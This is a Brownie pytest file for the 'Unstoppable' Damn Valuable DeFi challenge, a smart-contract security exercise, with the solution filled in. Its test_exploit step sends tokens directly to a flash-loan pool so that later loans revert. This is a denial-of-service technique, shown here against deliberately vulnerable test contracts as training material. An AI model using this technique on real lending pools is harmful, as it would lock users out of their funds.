import pytest

from brownie import accounts, DamnValuableToken, UnstoppableLender, ReceiverUnstoppable, reverts

@pytest.fixture(scope='module')
def deployer(accounts):
    return accounts[0]

@pytest.fixture(scope='module')
def attacker(accounts):
    return accounts[1]


@pytest.fixture(scope='module')
def someUser(accounts):
    return accounts[2]

@pytest.fixture(scope='module')
def token(deployer):
    return DamnValuableToken.deploy({'from': deployer})


@pytest.fixture(scope='module')
def pool(token,deployer):
    return UnstoppableLender.deploy(token.address,{'from': deployer})


@pytest.fixture(scope='module')
def receiverContract(pool,someUser):
    return ReceiverUnstoppable.deploy(pool.address,{'from':someUser})

@pytest.fixture(scope='module',autouse=True)
def setup(token,pool,receiverContract,deployer,attacker,someUser): 
    ''' [Challenge] Unstoppable '''

    # Pool has 1M * 10**18 tokens
    TOKENS_IN_POOL = 1000000e18
    INITIAL_ATTACKER_BALANCE = 100e18
    
    # SETUP SCENARIO
    token.approve(pool.address, TOKENS_IN_POOL, {'from':deployer})
    pool.depositTokens(TOKENS_IN_POOL,{'from':deployer})
    token.transfer(attacker.address, INITIAL_ATTACKER_BALANCE, {'form':deployer})

    assert token.balanceOf(pool.address) == TOKENS_IN_POOL
    assert token.balanceOf(attacker.address) == INITIAL_ATTACKER_BALANCE
       

def test_flashloan(receiverContract,someUser):
    # Show it's possible for anyone to take out a flash loan
    
    receiverContract.executeFlashLoan(10,{'from':someUser})
    
     
    
    
def test_exploit(pool,token,attacker):
    # Exploit goes here
    
    token.transfer(pool.address, '1 ether', {'from': attacker})



def test_success(receiverContract,someUser):
    # SUCCESS CONDITION 
    with reverts():
        receiverContract.executeFlashLoan(10, {'from': someUser})
     
   
